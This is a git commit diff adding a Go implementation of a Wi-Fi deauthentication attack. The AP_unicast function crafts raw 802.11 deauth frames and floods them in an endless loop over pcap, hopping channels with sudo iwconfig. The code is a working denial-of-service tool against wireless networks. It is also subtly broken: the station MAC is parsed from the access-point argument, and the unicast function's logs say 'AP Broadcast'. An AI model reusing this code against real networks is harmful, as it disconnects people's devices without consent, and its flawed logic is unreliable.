02d0c742e68f4b993b29436fb22a941e7bf76d1b
H4uN <dohyun0822@gmail.com>
2023-01-27 16:20:47 +0900

    uni

--- main.go
+++ main.go
@@ -142,8 +142,64 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 }
 
 func AP_unicast(User_interface string, Ap_mac string, Station_mac string) {
+	handle, err := pcap.OpenLive(User_interface, defaultSnapLen, true, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+		os.Exit(-1)
+	}
+	defer handle.Close()
+
 	CH := _Init_(User_interface)
 	fmt.Println("AP_unicast | Channel : ", CH)
+	buffer := new(bytes.Buffer)
+	addr_station := strings.SplitN(Ap_mac, ":", 6)
+	var tmp_mac1 []uint8
+	for _, str := range addr_station {
+		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
+		if err != nil {
+			fmt.Println(err)
+		}
+		tmp_uint8 := uint8(tmp_uint64)
+		tmp_mac1 = append(tmp_mac1, tmp_uint8)
+	}
+	Deauth_Header := [21]byte{0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, tmp_mac1[0], tmp_mac1[1], tmp_mac1[2], tmp_mac1[3], tmp_mac1[4], tmp_mac1[5]}
+	binary.Write(buffer, binary.LittleEndian, Deauth_Header)
+
+	addr_ap := strings.SplitN(Ap_mac, ":", 6)
+	var tmp_mac2 []uint8
+	for _, str := range addr_ap {
+		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
+		if err != nil {
+			fmt.Println(err)
+		}
+		tmp_uint8 := uint8(tmp_uint64)
+		tmp_mac2 = append(tmp_mac2, tmp_uint8)
+	}
+
+	Deauth_AP_MAC := [12]byte{tmp_mac2[0], tmp_mac2[1], tmp_mac2[2], tmp_mac2[3], tmp_mac2[4], tmp_mac2[5], tmp_mac2[0], tmp_mac2[1], tmp_mac2[2], tmp_mac2[3], tmp_mac2[4], tmp_mac2[5]}
+	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
+	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
+	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
+	Deauth_packet := buffer.Bytes()
+	for {
+		if CH == 0 {
+			for ch_hop := 1; ch_hop < 15; ch_hop++ {
+				tmp_ch := strconv.Itoa(ch_hop)
+				ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_ch)
+				fmt.Println("Channel Hopping : ", tmp_ch)
+				for i := 0; i < 20; i++ {
+					handle.WritePacketData(Deauth_packet)
+					fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface, "Channel : ", tmp_ch)
+					time.Sleep(time.Millisecond * 50)
+				}
+			}
+		} else {
+			handle.WritePacketData(Deauth_packet)
+			fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface, "Channel : ", CH)
+			time.Sleep(time.Millisecond * 50)
+		}
+	}
+
 }
 
 func AP_unicast_authentication(User_interface string, Ap_mac string, Station_mac string) {
